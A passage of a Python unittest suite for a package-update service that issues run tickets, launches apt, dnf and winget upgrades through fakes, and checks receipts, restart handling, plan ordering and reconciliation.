            with self.subTest(missing=missing), registered(made.route), mock.patch.object(service_updates, "_start_child") as started, \
                    mock.patch.object(readonly_runner, "HostProbe", side_effect=AssertionError("a probe of this computer was built")), \
                    self.assertRaises(ServiceRefusal) as caught:
                made.service.run_ticket(ticket_id=ticket, terminal=FakeTerminal(), **fakes)
            self.assertEqual((caught.exception.code, started.called, made.entered()), ("package-fixture-session", False, False))
            self.assertEqual(fakes.get("launcher", FakeChild()).calls, [])

    def test_ticket_for_a_closed_operation_never_launches(self):
        made = harness()
        ticket = made.issue()["ticket_id"]
        made.service._reconcile_package_upgrade(SESSION, made.operation, made.intent, made.payload, operation_id=OPERATION)
        self.assertEqual((made.finished[0]["outcome"], made.finished[0]["receipt"]["adapter_invoked"]), ("failed", False))
        child = FakeChild()
        with self.assertRaises(ServiceRefusal) as caught:
            made.run(ticket, child=child)
        self.assertEqual((caught.exception.code, child.calls), ("package-ticket-closed", []))
        # A ticket whose run already started is never started again.
        made = harness()
        ticket = made.issue()["ticket_id"]
        made.run(ticket)
        made.operation["outcome"] = None
        child = FakeChild()
        with self.assertRaises(ServiceRefusal) as caught:
            made.run(ticket, child=child)
        self.assertEqual((caught.exception.code, child.calls), ("package-ticket-used", []))

    def test_run_child_is_never_killed(self):
        made = harness()
        ticket = made.issue()["ticket_id"]
        child = FakeChild()
        made.run(ticket, child=child)
        self.assertEqual(child.killed, [])
        self.assertEqual(set(vars(child.calls[0])), {"argv", "env", "cwd", "terminal"})
        tree = ast.parse((ROOT / "scripts" / "service_updates.py").read_text(encoding="utf-8"))
        launcher = next(node for node in tree.body if isinstance(node, ast.FunctionDef) and node.name == "_start_child")
        killing = [node.attr for node in ast.walk(tree) if isinstance(node, ast.Attribute) and node.attr in {"kill", "terminate", "killpg", "send_signal"}]
        timeouts = [keyword.arg for node in ast.walk(launcher) if isinstance(node, ast.Call) for keyword in node.keywords if keyword.arg == "timeout"]
        self.assertEqual((killing, timeouts), ([], []))

    def test_restart_signal_records_pending_instead_of_finishing(self):
        for name, route, child in (("probe", fake_route(restart_probe="apt.needrestart", restart=lambda found: "required"), FakeChild()),
                                   ("exit code", fake_route(classify=lambda code, tail: "restart"), FakeChild(code=0x8A150109))):
            with self.subTest(source=name):
                made = harness(route)
                ticket = made.issue()["ticket_id"]
                result = made.run(ticket, child=child)
                self.assertEqual(made.finished, [])
                self.assertIsNone(made.operation["outcome"])
                made.service.engine.record_restart_pending.assert_called_once()
                row = made.registered[-1]
                self.assertEqual((row["kind"], row["facts"]["restart_signal"]), ("outcome", "required"))
                self.assertEqual(row["facts"]["restart_source"], "apt.needrestart" if name == "probe" else "exit_code")
                self.assertEqual((result["receipt"]["result"], result["receipt"]["category"]), ("restart_needed", "need_restart"))
        # A verify_after_restart item enters the restart class even without a signal.
        made = harness(flags=("verify_after_restart",))
        made.run(made.issue()["ticket_id"])
        self.assertEqual((made.finished, made.operation.get("restart_pending")), ([], {"signal": "required", "source": "verify_after_restart"}))

    def test_second_run_after_restart_only_checks_never_reruns(self):
        events = []
        made = harness(fake_route(events, restart_probe="apt.needrestart", restart=lambda found: "required"))
        ticket = made.issue()["ticket_id"]
        first = FakeChild()
        made.run(ticket, child=first)
        self.assertEqual(len(first.calls), 1)
        events.clear()
        second = FakeChild()
        # Without a boot time the check holds; nothing starts.
        with self.assertRaises(ServiceRefusal) as caught:
            made.run(ticket, child=second, probe=RunProbe())
        self.assertEqual(caught.exception.code, "package-boot-unavailable")
        made.run(ticket, child=second, probe=RunProbe(boot={"last_boot_utc": utc_now(), "boot_id": "boot-2", "source": "fictional_probe"}))
        self.assertEqual(second.calls, [])
        made.service.engine.record_boot_observation.assert_called_once()
        boot = json.loads(made.registered[-1]["content"])
        self.assertEqual((boot["schema"], boot["boot_id"], boot["source"]), ("patchcairn.boot.observation", "boot-2", "fictional_probe"))
        self.assertEqual(set(boot), {"schema", "schema_version", "last_boot_utc", "boot_id", "observed_utc", "source"})
        self.assertEqual(events, ["verify"])
        self.assertEqual((made.finished[0]["outcome"], made.finished[0]["receipt"]["after_restart"]), ("succeeded", True))
        # A failure after the boot closes once and carries the facts resolve reads.
        made = harness(fake_route(restart_probe="apt.needrestart", restart=lambda found: "required", result="did_not_update"))
        ticket = made.issue()["ticket_id"]
        made.run(ticket)
        made.run(ticket, probe=RunProbe(boot={"last_boot_utc": utc_now(), "boot_id": "boot-3"}))
        receipt = made.finished[0]["receipt"]
        self.assertEqual((made.finished[0]["outcome"], receipt["result"], len(made.finished)), ("failed", "did_not_update", 1))
        self.assertEqual((receipt["actual_effects_recorded"], receipt["no_active_effects"], receipt["recovery_retained"]), (True, True, True))


@refusals_fail
class ReceiptTests(unittest.TestCase):
    def receipt(self, route, child=None, **keywords):
        made = harness(route, **keywords)
        made.run(made.issue()["ticket_id"], child=child or FakeChild())
        return made.finished[0]["receipt"]

    def test_os_consent_is_observed_not_observed_or_not_applicable(self):
        self.assertEqual(self.receipt(fake_route(os_consent="not_observed"))["os_consent"], "not_observed")
        self.assertEqual(self.receipt(fake_route(os_consent="not_applicable"))["os_consent"], "not_applicable")
        self.assertEqual(self.receipt(fake_route(os_consent="exit_observed"))["os_consent"], "observed")
        unstarted = self.receipt(fake_route(os_consent="exit_observed"), child=FakeChild(error=FileNotFoundError("missing")))
        self.assertEqual((unstarted["os_consent"], unstarted["adapter_invoked"]), ("not_observed", False))
        # Exit 0 means sudo ran the command; any other exit, such as three wrong passwords, observed no consent.
        for code in (1, 100, -2):
            refused = self.receipt(fake_route(os_consent="exit_observed", result="did_not_update"), child=FakeChild(code=code))
            self.assertEqual(refused["os_consent"], "not_observed", code)
        # The core routes: an installer's own prompt (winget) cannot be observed; Homebrew never elevates; sudo's result is its exit.
        self.assertEqual({manager: route["run"]["os_consent"] for manager, route in package_registry.DESCRIPTORS.items()},
                         {"winget": "not_observed", "brew": "not_applicable", "apt": "exit_observed", "dnf": "exit_observed"})
        for value in (self.receipt(fake_route(os_consent=rule))["os_consent"] for rule in package_registry.OS_CONSENT):
            self.assertIn(value, ("observed", "not_observed", "not_applicable"))

    def test_terminal_receipt_says_tty_observed_never_person_confirmed(self):
        receipt = self.receipt(fake_route())
        self.assertEqual((receipt["terminal"], receipt["device_number"]), ("tty_observed", "not_applicable"))
        process = self.receipt(fake_route(run_kind="process"))
        self.assertEqual(process["terminal"], "not_applicable")
        text = encoded(receipt).decode("ascii").lower()
        for claim in ("confirm", "person", "owner", "consented", "approved_by"):
            self.assertNotIn(claim, text)
        self.assertEqual(set(receipt), RECEIPT_KEYS)


# The receipt layout of a finished run (golden): the service's _finish copies result, verified_postcondition and the resolve facts.
RECEIPT_KEYS = {"adapter_invoked", "manager", "operation", "id", "version", "run_kind", "exit", "terminal", "device_number", "os_consent",
                "restart", "already_pending", "installed_version", "changed_outside_plan", "result", "category", "group", "verified_postcondition"}
TICKET_KEYS = {"schema", "schema_version", "kind", "ticket_id", "session_id", "operation_id", "action_id", "plan_sha256",
               "adapter_payload_sha256", "run_folder", "run_files", "issued_utc"}


@refusals_fail
class RecordLayoutTests(unittest.TestCase):
    def test_ticket_and_receipt_layouts_golden(self):
        made = harness(run_files={"requirements.txt": "example-tool==1.0.0\n"})
        issued = made.issue()
        ticket = json.loads((made.service.work / "tickets" / (issued["ticket_id"] + ".json")).read_text(encoding="utf-8"))
        self.assertEqual(set(ticket), TICKET_KEYS)
        self.assertEqual((ticket["kind"], ticket["run_folder"], ticket["run_files"]), ("package_ticket", str(made.folder), made.payload["run_files"]))
        made.run(issued["ticket_id"])
        receipt = made.finished[0]["receipt"]
        self.assertEqual(set(receipt), RECEIPT_KEYS)
        self.assertEqual(set(receipt["exit"]), {"code", "source", "class", "signal", "started_utc", "finished_utc", "seconds"})
        self.assertEqual((receipt["exit"]["code"], receipt["exit"]["source"]), (0, "process"))
        self.assertEqual(receipt["category"], pc_records.UPDATE_RESULTS[receipt["result"]])
        self.assertEqual(set(receipt["restart"]), {"signal", "source"})
        exited = json.loads((made.service._operation_dir(SESSION, OPERATION) / service_updates.EXIT_RECORD).read_text(encoding="utf-8"))
        self.assertEqual(set(exited), {"schema", "schema_version", "kind", "mode", "observed_utc", "binding", "receipt"})
        self.assertEqual(exited["kind"], "service_outcome")
        self.assertEqual(set(exited["receipt"]), {"adapter_invoked", "terminal", "device_number", "os_consent", "exit"})
        self.assertEqual(exited["receipt"]["exit"], receipt["exit"])

    def test_exit_code_normalised_and_failures_never_success(self):
        cases = ((0x8A150101 - 2 ** 32, "failed", "did_not_update"), (0, "succeeded", "updated"))
        for code, outcome, result in cases:
            with self.subTest(code=code):
                made = harness(fake_route(result=result, run_kind="process"))
                made.run(made.issue()["ticket_id"], child=FakeChild(code=code))
                receipt = made.finished[0]["receipt"]
                self.assertEqual((receipt["exit"]["code"], made.finished[0]["outcome"], receipt["result"]), (code & 0xFFFFFFFF, outcome, result))
        # The manager reports a failure but the target is present: never "updated".
        made = harness(fake_route(classify=lambda code, tail: "failed", run_kind="process"))
        made.run(made.issue()["ticket_id"], child=FakeChild(code=1))
        self.assertEqual((made.finished[0]["outcome"], made.finished[0]["receipt"]["result"]), ("failed", "differs_from_plan"))


class PlanOrderTests(unittest.TestCase):
    def entry(self, action_id, *flags, manager="pip", item=None, depends_on=None):
        found = {"action_id": action_id, "manager": manager, "id": item or action_id, "flags": list(flags)}
        return found if depends_on is None else {**found, "depends_on": depends_on}

    def test_plan_order_puts_restart_likely_then_host_and_own_runtime_last(self):
        entries = [self.entry("own", "own_runtime"), self.entry("kernel", "restart_likely"), self.entry("host", "host_package"),
                   self.entry("tool-a"), self.entry("tool-b"), self.entry("big", "high_risk")]
        with registered(fake_route()):
            ordered = [entry["action_id"] for entry in package_registry.plan_order(entries)]
        self.assertEqual(ordered, ["tool-a", "tool-b", "big", "kernel", "own", "host"])

    def test_environment_packages_run_before_their_runtime_update(self):
        entries = [self.entry("runtime", "runtime_line_change"), self.entry("env-package-1"), self.entry("env-package-2"),
                   self.entry("app-installer", manager="winget", item="Microsoft.AppInstaller"), self.entry("editor", manager="winget", item="Example.Editor")]
        with registered(fake_route()):
            ordered = [entry["action_id"] for entry in package_registry.plan_order(entries)]
        self.assertEqual(ordered, ["env-package-1", "env-package-2", "editor", "runtime", "app-installer"])

    def test_sort_preserves_dependencies_and_runs_before_hashing(self):
        # An ordinary item that needs a restart-likely one runs after it; unknown, repeated or circular needs refuse.
        entries = [self.entry("needs-kernel", depends_on=["kernel"]), self.entry("kernel", "restart_likely"), self.entry("tool")]
        with registered(fake_route()):
            self.assertEqual([e["action_id"] for e in package_registry.plan_order(entries)], ["tool", "kernel", "needs-kernel"])
            for bad in ([self.entry("a", depends_on=["b"]), self.entry("b", depends_on=["a"])], [self.entry("a", depends_on=["missing"])],
                        [self.entry("a", depends_on=["a"])], [self.entry("a"), self.entry("a")], [self.entry("a", depends_on=["b", "b"]), self.entry("b")]):
                with self.subTest(bad=bad), self.assertRaises(pc_records.Refusal):
                    package_registry.plan_order(bad)
        # prepare_package_action sorts before any payload is hashed into an action: _action receives the payloads in that order.
        route = fake_route()
        service = object.__new__(WorkflowService)
        service.root = fixture_root()
        ensure_private_directory(service.root / "work", create=True, parents=True)
        service._lock = lambda: nullcontext()
        service._state = mock.Mock(return_value={"session_id": SESSION, "mode": "fixture"})
        hashed = []
        def action(state, **keywords):
            hashed.append((keywords["action_id"], digest(keywords["payload"]), keywords["payload"].get("depends_on")))
            return {"action_id": keywords["action_id"], "adapter_payload_sha256": digest(keywords["payload"]),
                    "rendered_command": keywords["rendered_command"]}
        service._action = mock.Mock(side_effect=action)
        items = [{"action_id": "host", "manager": "pip", "id": "host-tool"}, {"action_id": "needs-kernel", "manager": "pip", "id": "plugin"},
                 {"action_id": "kernel", "manager": "pip", "id": "kernel-tool"}]
        route = fake_route(dependencies={"plugin": ["kernel-tool@1.0.0"]}, item_flags={"host-tool": ["host_package"], "kernel-tool": ["restart_likely"]})
        with registered(route):
            actions = service.prepare_package_action(SESSION, adapter_id=UPGRADE, items=items, target="t", benefit="b", risk="r",
                                                     reversibility="v", verification="c", probe=RunProbe(), launcher=FakeLauncher())
        self.assertEqual([a["action_id"] for a in actions], ["kernel", "needs-kernel", "host"])
        self.assertEqual([entry[0] for entry in hashed], ["kernel", "needs-kernel", "host"])
        self.assertEqual(hashed[1][2], ["kernel"])
        self.assertTrue(all(a["rendered_command"].startswith(SUDO + " ") for a in actions))
        # What an item needs comes from its manager: a caller cannot name it, in either direction.
        for depends_on in ([], ["kernel"]):
            with self.subTest(depends_on=depends_on), registered(route), self.assertRaises(ServiceRefusal):
                service.prepare_package_action(SESSION, adapter_id=UPGRADE, items=[{**items[0], "depends_on": depends_on}], target="t", benefit="b", risk="r",
                                               reversibility="v", verification="c", probe=RunProbe(), launcher=FakeLauncher())
        # A route without dependency data leaves the key out, which means every earlier action.
        hashed.clear()
        with registered(fake_route()):
            service.prepare_package_action(SESSION, adapter_id=UPGRADE, items=items, target="t", benefit="b", risk="r", reversibility="v", verification="c",
                                           probe=RunProbe(), launcher=FakeLauncher())
        self.assertEqual([entry[2] for entry in hashed], [None, None, None])


@refusals_fail
class PackageServiceTests(unittest.TestCase):
    """Discovery, prepare and the core routes at the service's own seams (fake engine, fake computer)."""

    def service(self):
        service = object.__new__(WorkflowService)
        service.root = fixture_root()
        ensure_private_directory(service.root / "work", create=True, parents=True)
        service._lock = lambda: nullcontext()
        service._state = mock.Mock(return_value={"session_id": SESSION, "mode": "fixture"})
        service._register = mock.Mock(return_value={"evidence_id": "evidence-1"})
        return service

    def test_a_practice_session_never_reads_this_computer(self):
        service = self.service()
        item = {"action_id": "x", "manager": "pip", "id": "example-tool"}
        for fakes in ({}, {"probe": RunProbe()}, {"launcher": FakeLauncher()}):  # each needs both
            for name, call in (("discovery", lambda: service.discover_packages(SESSION, manager="pip", **fakes)),
                               ("preparation", lambda: service.prepare_package_action(SESSION, adapter_id=UPGRADE, items=[item], target="t", benefit="b",
                                                                                      risk="r", reversibility="v", verification="c", **fakes))):
                with self.subTest(step=name, fakes=sorted(fakes)), mock.patch.object(readonly_runner, "HostProbe") as host, \
                        mock.patch.object(readonly_runner, "_launch", side_effect=AssertionError("a read ran")), registered(fake_route()), \
                        self.assertRaises(ServiceRefusal) as caught:
                    call()
                self.assertEqual((caught.exception.code, host.called), ("package-fixture-session", False))

    def winget_reader(self, installed="winget-installed-before.txt"):
        outputs = {"--version": WINGET_OUTPUT, "source": fixture("winget-source.json"), "export": b"", "list": None}
        calls = []
        def read(argv, **keywords):
            calls.append(argv)
            if argv[1] == "list" and "--upgrade-available" in argv:
                return 0, fixture("winget-upgrades.txt")
            if argv[1] == "list":
                return 0, fixture(installed)
            return 0, outputs[argv[1]]
        read.calls = calls
        return read

    def test_discovery_uses_a_fresh_run_folder_in_the_one_namespace(self):
        service, folders = self.service(), []
        def discover(probe, run):
            folders.append(Path(run.folder))
            self.assertEqual(os.listdir(run.folder), [])
            return {"candidates": [], "left_out": [], "holds": []}
        route = MappingProxyType({**fake_route(), "discover": discover})
        with registered(route):
            service.discover_packages(SESSION, manager="pip", launcher=FakeLauncher(), probe=RunProbe())
            service.discover_packages(SESSION, manager="pip", launcher=FakeLauncher(), probe=RunProbe())
        self.assertEqual(len(set(folders)), 2)
        for folder in folders:
            self.assertEqual(folder.parent, service.root / "work" / "package-runs")
            self.assertTrue(folder.name.startswith("run-") and folder.is_dir())
        # winget discovery writes its export file into exactly the run folder it is given and reads it back from there;
        # it never accepts an agreement.
        service = self.service()
        service._run_folder = mock.Mock(return_value=PureWindowsPath(RUN_FOLDER))
        probe, reader = RunProbe(platform="win32"), self.winget_reader()
        probe.read_file = lambda path: fixture("winget-export.json") if path == RUN_FOLDER + "\\winget-export.json" else None
        found = service.discover_packages(SESSION, manager="winget", launcher=reader, probe=probe)
        self.assertEqual(probe.admitted, [RUN_FOLDER])
        self.assertEqual([argv[3] for argv in reader.calls if argv[1] == "export"], [RUN_FOLDER + "\\winget-export.json"])
        self.assertEqual([c["id"] for c in found["candidates"]], ["Contoso.NoteTaker"])
        self.assertIn({"name": "Fabrikam.PhotoViewerPro", "reason": "winget-confirm"}, found["left_out"])
        self.assertEqual(found["wording"], "changes no installed software; the manager may refresh its own lists and logs")
        self.assertEqual(found["list_age"]["status"], "unknown")
        self.assertNotIn("up to date", json.dumps(found).lower())
        self.assertFalse(any({"--accept-source-agreements", "--accept-package-agreements"} & set(argv) for argv in reader.calls))

    def test_agreements_come_only_from_recorded_consent(self):
        for agreements, expected in (([], set()), (["package"], {"--accept-package-agreements"}),
                                     (["package", "source"], {"--accept-package-agreements", "--accept-source-agreements"})):
            with self.subTest(agreements=agreements):
                service = self.service()
                service._run_folder = mock.Mock(return_value=PureWindowsPath(RUN_FOLDER))
                captured = []
                service._action = mock.Mock(side_effect=lambda state, **keywords: captured.append(keywords) or {"action_id": keywords["action_id"]})
                service.prepare_package_action(SESSION, adapter_id=UPGRADE, target="t", benefit="b", risk="r", reversibility="v", verification="c",
                                               items=[{"action_id": "editor", "manager": "winget", "id": "Contoso.NoteTaker", "agreements": agreements}],
                                               probe=RunProbe(platform="win32"), launcher=self.winget_reader())
                payload = captured[0]["payload"]
                self.assertEqual(payload["agreements"], sorted(agreements))
                shown = set(captured[0]["rendered_command"].split())
                self.assertEqual(shown & {"--accept-package-agreements", "--accept-source-agreements"}, expected)
                self.assertEqual((payload["id"], payload["version"], payload["source"]), ("Contoso.NoteTaker", "3.4.1", "winget"))
                self.assertEqual(payload["transaction_sha256"], digest(payload["preflight"]))
        service = self.service()
        service._run_folder = mock.Mock(return_value=PureWindowsPath(RUN_FOLDER))
        with self.assertRaises(ServiceRefusal):
            service.prepare_package_action(SESSION, adapter_id=UPGRADE, target="t", benefit="b", risk="r", reversibility="v", verification="c",
                                           items=[{"action_id": "x", "manager": "winget", "id": "Contoso.NoteTaker", "agreements": ["everything"]}],
                                           probe=RunProbe(platform="win32"), launcher=self.winget_reader())

    def test_apt_and_dnf_run_through_sudo_in_the_persons_terminal_or_show_the_launcher_command(self):
        dnf_link = {"/usr/bin/dnf": "/usr/bin/dnf5"}
        for manager, recipe, version in (("apt", "apt.upgrade", "1.2.3-1"), ("dnf", "dnf.upgrade", "example-tool-0:1.2.3-1.fc41.x86_64")):
            with self.subTest(manager=manager):
                route = {**package_registry.DESCRIPTORS[manager], "drift": lambda probe, run, payload: None}
                fields = {"manager": manager, "operation": "upgrade", "id": "example-tool", "version": version, "source": "example-updates",
                          "group": "system_drivers", "flags": [], "preflight": {"fictional": True}, "dependencies": [], "agreements": [],
                          "run_kind": "terminal", "recipe": recipe, "run_files": {}, "executable": {"kind": "system", "path": SUDO, "identity": sudo_identity()}}
                made = Harness(route, package_registry.payload(fields, environment=route["run"]["environment"](RunProbe(links=dnf_link))))
                ticket = made.issue()["ticket_id"]
                child = FakeChild()
                held = made.run(ticket, child=child, terminal=FakeTerminal(tty=False), probe=RunProbe(links=dnf_link), routes=(route,))
                self.assertEqual((held.get("hold"), child.calls), ("package-terminal-needed", []))
                self.assertIn("run --ticket " + ticket, held["command"])
                made.run(ticket, child=child, probe=RunProbe(links=dnf_link), routes=(route,))
                call = child.calls[0]
                self.assertEqual((call.argv[0], call.terminal, call.cwd), (SUDO, True, str(made.folder)))
                self.assertIn(version if manager == "dnf" else "example-tool=" + version, call.argv)
                self.assertEqual(call.env, route["run"]["environment"](RunProbe()))
                self.assertEqual(made.finished[0]["receipt"]["terminal"], "tty_observed")

    def test_unknown_or_unbuilt_manager_and_unwritten_adapter_refused_at_prepare(self):
        service = self.service()
        service._action = mock.Mock()
        for adapter_id, manager in ((UPGRADE, "pip"), (UPGRADE, "chocolatey"), (FIRMWARE, "winget"), (HANDOFF, "winget")):
            with self.subTest(adapter_id=adapter_id, manager=manager), self.assertRaises(ServiceRefusal):
                service.prepare_package_action(SESSION, adapter_id=adapter_id, target="t", benefit="b", risk="r", reversibility="v", verification="c",
                                               items=[{"action_id": "x", "manager": manager, "id": "Example.Tool"}], probe=RunProbe(), launcher=FakeLauncher())
        service._action.assert_not_called()

    def test_apps_outside_the_managers_listed_with_their_update_path(self):
        # collect_inventory is the only consumer of the collectors; this calls it through the service.
        service = self.service()
        inventory = {"platform": "linux", "observations": [
            {"kind": "package", "name": "fictional-editor", "version": "1.0", "manager": "dpkg"},
            {"kind": "package", "name": "fictional-notes", "version": "2.0", "manager": "snap"},
            {"kind": "application", "name": "Fictional Viewer" + "x" * 300, "version": None, "manager": "unknown"},
            {"kind": "application", "name": "Fictional\u202e Rot\x1b[31m\u200bated\u2028", "version": "1\x07.0", "manager": "unknown"},
            {"kind": "kernel", "name": "Running Linux kernel", "version": "6.8", "manager": "uname"}]}
        collector = object()
        with mock.patch.object(WorkflowService, "collect_inventory", return_value=inventory, create=False) as collect:
            rows = service._apps_outside_managers(SESSION, collector)
        collect.assert_called_once_with(SESSION, collector=collector)
        self.assertEqual([(row["manager"], row["update_path"]) for row in rows], [("snap", "snap_store"), ("unknown", "app_store_or_vendor"), ("unknown", "app_store_or_vendor")])
        self.assertEqual(len(rows[1]["name"]), service_updates.MAX_SHOWN_TEXT)
        # Hidden characters from a collector reach neither the assistant nor the evidence.
        self.assertEqual((rows[2]["name"], rows[2]["version"]), ("Fictional Rot[31mated", "1.0"))


@refusals_fail
class ReconcileTests(unittest.TestCase):
    """Each written action's reconciliation: a ticket never started closes as not run; a started run stays unknown until its
    exit is recorded, and with the exit recorded it closes through the one completion."""

    def test_each_written_action_reconciles(self):
        for adapter_id in (UPGRADE, REINSTALL, REPAIR):
            reconcile = "_reconcile_" + adapter_id.replace(".", "_")
            with self.subTest(adapter_id=adapter_id, case="never started"):
                made = harness(adapter_id=adapter_id)
                made.issue()
                getattr(made.service, reconcile)(SESSION, made.operation, made.intent, made.payload, operation_id=OPERATION)
                self.assertEqual((made.finished[0]["outcome"], made.finished[0]["receipt"]["result"]), ("failed", "not_run"))
            for result, outcome in (("updated", "succeeded"), ("did_not_update", "failed")):
                with self.subTest(adapter_id=adapter_id, case=result):
                    made = harness(fake_route(result=result), adapter_id=adapter_id)
                    made.interrupted(made.issue()["ticket_id"])
                    self.assertTrue(made.exit_recorded())
                    made.reconcile()
                    self.assertEqual((made.finished[0]["outcome"], made.finished[0]["receipt"]["result"]), (outcome, result))
                    self.assertEqual(len(made.finished), 1)
        made = harness()
        made.operation["outcome"] = "succeeded"
        with self.assertRaises(ServiceRefusal):
            made.service._reconcile_package_upgrade(SESSION, made.operation, made.intent, made.payload, operation_id=OPERATION)

    def test_without_the_recorded_exit_it_stays_unknown_even_with_the_target_installed(self):
        for adapter_id in (UPGRADE, REINSTALL, REPAIR):
            with self.subTest(adapter_id=adapter_id):
                events = []
                made = harness(fake_route(events, result="updated"), adapter_id=adapter_id)
                ticket = made.issue()["ticket_id"]
                # The parent stops while the child runs on: the effect boundary is written, no exit is known.
                with self.assertRaises(KeyboardInterrupt):
                    made.run(ticket, child=FakeChild(error=KeyboardInterrupt()))
                self.assertEqual((made.entered(), made.exit_recorded()), (True, False))
                made.reconcile()
                receipt = made.finished[0]["receipt"]
                self.assertEqual((made.finished[0]["outcome"], receipt["result"], receipt["verified_postcondition"]), ("unknown", "unknown", False))
                self.assertNotIn("no_active_effects", receipt)
                self.assertNotIn("verify", events)
                # Asked again it stays held, and nothing new is recorded.
                self.assertEqual(made.reconcile(), {"operation_id": OPERATION, "outcome": "unknown", "held": True, "automatic_retry": False})
                self.assertEqual(len(made.finished), 1)

    def test_the_recorded_exit_must_be_this_operations(self):
        made = harness()
        made.interrupted(made.issue()["ticket_id"])
        made.operation["plan_sha256"] = "b" * 64
        with self.assertRaises(ServiceRefusal):
            made.reconcile()
        self.assertEqual(made.finished, [])

    def test_a_restart_found_after_the_exit_record_keeps_the_operation_open(self):
        made = harness(fake_route(classify=lambda code, tail: "restart", result="did_not_update"))
        made.interrupted(made.issue()["ticket_id"], child=FakeChild(code=3010))
        made.reconcile()
        self.assertEqual((made.finished, made.operation.get("restart_pending")), ([], {"signal": "required", "source": "exit_code"}))
        with self.assertRaises(ServiceRefusal) as caught:
            made.reconcile()
        self.assertEqual(caught.exception.code, "package-restart-class")


@refusals_fail
class CompletionTests(unittest.TestCase):
    """The one completion of a run: the same result function after the run, after the restart and in reconciliation."""

    def boot(self):
        return RunProbe(boot={"last_boot_utc": utc_now(), "boot_id": "boot-2", "source": "fictional_probe"})

    def paths(self, route_keywords=None):
        """Each completion path, one fresh harness each: {path name: harness}."""
        route = lambda **more: fake_route(**{**(route_keywords or {}), **more})
        found = {}
        made = harness(route())
        made.run(made.issue()["ticket_id"], child=FakeChild(code=0))
        found["run"] = made
        made = harness(route(restart_probe="apt.needrestart", restart=lambda found: "required"))
        ticket = made.issue()["ticket_id"]
        made.run(ticket)
        made.route = route(restart_probe="apt.needrestart", restart=lambda found: "none")
        made.run(ticket, probe=self.boot())
        found["after restart"] = made
        made = harness(route())
        made.interrupted(made.issue()["ticket_id"])
        made.reconcile()
        found["reconcile"] = made
        return found

    def test_every_completion_path_goes_through_the_one_result_function(self):
        selected, original = [], package_registry.route_result
        def spy(payload, exited, verification, *, signal=None):
            selected.append(exited["class"] if exited else None)
            return original(payload, exited, verification, signal=signal)
        with mock.patch.object(package_registry, "route_result", side_effect=spy):
            for name, made in self.paths().items():
                with self.subTest(path=name):
                    self.assertEqual((made.finished[-1]["outcome"], made.finished[-1]["receipt"]["result"]), ("succeeded", "updated"))
            made = harness()
            with self.assertRaises(KeyboardInterrupt):
                made.run(made.issue()["ticket_id"], child=FakeChild(error=KeyboardInterrupt()))
            made.reconcile()
        # Run; the restart signal and its check after the boot; reconcile with a recorded exit; reconcile without one.
        self.assertEqual(selected, ["success", "success", "success", "success", None])
        tree = ast.parse((ROOT / "scripts" / "service_updates.py").read_text(encoding="utf-8"))
        callers = [node.name for node in ast.walk(tree) if isinstance(node, ast.FunctionDef)
                   for call in ast.walk(node) if isinstance(call, ast.Attribute) and call.attr == "route_result"]
        self.assertEqual(sorted(callers), ["_complete", "_no_exit"])

    def test_the_exit_is_recorded_before_anything_is_read(self):
        made, seen = harness(), []
        route = made.route
        def verify(payload, reads):
            seen.append(made.exit_recorded())
            return route["verify"](payload, reads)
        made.route = MappingProxyType({**route, "verify": verify})
        ticket = made.issue()["ticket_id"]
        made.run(ticket, child=FakeChild(code=0))
        record = json.loads((made.service._operation_dir(SESSION, OPERATION) / service_updates.EXIT_RECORD).read_text(encoding="utf-8"))
        self.assertEqual(seen, [True])
        self.assertEqual(record["binding"], {"operation_id": OPERATION, "action_id": ACTION, "plan_sha256": PLAN})
        self.assertEqual((record["receipt"]["exit"]["code"], record["receipt"]["exit"]["class"], record["receipt"]["adapter_invoked"]), (0, "success", True))

    def test_a_terminal_failure_holds_and_integrity_beats_restart(self):
        apt = package_registry.APT["classify_exit"]
        required = {"restart_probe": "apt.needrestart", "restart": lambda found: "required"}
        cases = (("terminal failure with an unchanged version", {"run_kind": "terminal", "result": "did_not_update"}, b"", "could_not_check"),
                 ("terminal failure and a restart signal", {"run_kind": "terminal", "result": "did_not_update", **required}, b"", "could_not_check"),
                 ("observed integrity failure and a restart signal", {"run_kind": "process", "result": "did_not_update", **required}, b"E: Hash Sum mismatch\n",
                  "integrity_failure"),
                 ("process failure with its output read", {"run_kind": "process", "result": "did_not_update"}, b"E: Unable to locate package\n", "did_not_update"))
        for name, keywords, tail, expected in cases:
            with self.subTest(case=name):
                made = harness(fake_route(classify=apt, **keywords))
                made.run(made.issue()["ticket_id"], child=FakeChild(code=100, tail=tail))
                self.assertEqual(len(made.finished), 1, "a failed run closes")
                self.assertEqual((made.finished[0]["outcome"], made.finished[0]["receipt"]["result"]), ("failed", expected))
                self.assertEqual(made.finished[0]["receipt"]["verified_postcondition"], expected == "did_not_update")
                made.service.engine.record_restart_pending.assert_not_called()

    def real_route(self, manager, version):
        """A harness around the real route of ``manager``, whose drift finds nothing."""
        route = {**package_registry.DESCRIPTORS[manager], "drift": lambda probe, run, payload: None}
        fields = {"manager": manager, "operation": "upgrade", "id": "example-tool", "version": version, "source": "example-updates", "group": "system_drivers", "flags": [],
                  "preflight": {"fictional": True}, "dependencies": [], "agreements": [], "run_kind": "terminal", "recipe": manager + ".upgrade", "run_files": {},
                  "executable": {"kind": "system", "path": SUDO, "identity": sudo_identity()}}
        return Harness(route, package_registry.payload(fields, environment=route["run"]["environment"](RunProbe())))

    def test_a_read_that_failed_stays_failed_through_replay(self):
        # The read before the run printed a parseable listing and exited with a code its recipe does not expect. The run was then cut
        # off after its exit; reconciliation replays the saved read, and must not take it for a good one.
        for manager, recipe_id, version, old, new in (("apt", "apt.installed", "1.2.3-1", b"example-tool\tamd64\t1.2.2-1\tii \n", b"example-tool\tamd64\t1.2.3-1\tii \n"),
                                                      ("dnf", "dnf.all_installed", "example-tool-0:1.2.3-1.fc41.x86_64", b"example-tool 0:1.2.2-1.fc41.x86_64\n",
                                                       b"example-tool 0:1.2.3-1.fc41.x86_64\n")):
            for code, result, verified in ((3, "could_not_check", False), (0, "updated", True)):
                with self.subTest(manager=manager, code=code):
                    made = self.real_route(manager, version)
                    made.interrupted(made.issue()["ticket_id"], reader=FakeLauncher(old, code=code), probe=RunProbe())
                    saved = json.loads((made.service._operation_dir(SESSION, OPERATION) / service_updates.BEFORE_RECORD).read_text(encoding="utf-8"))
                    self.assertEqual(saved["receipt"]["reads"][recipe_id], {"ok": code == 0, "exit_code": code})
                    made.reconcile(new)
                    receipt = made.finished[0]["receipt"]
                    self.assertEqual((receipt["result"], receipt["verified_postcondition"]), (result, verified))
        # The read after the run fails the same way on the ordinary path.
        made = self.real_route("apt", "1.2.3-1")
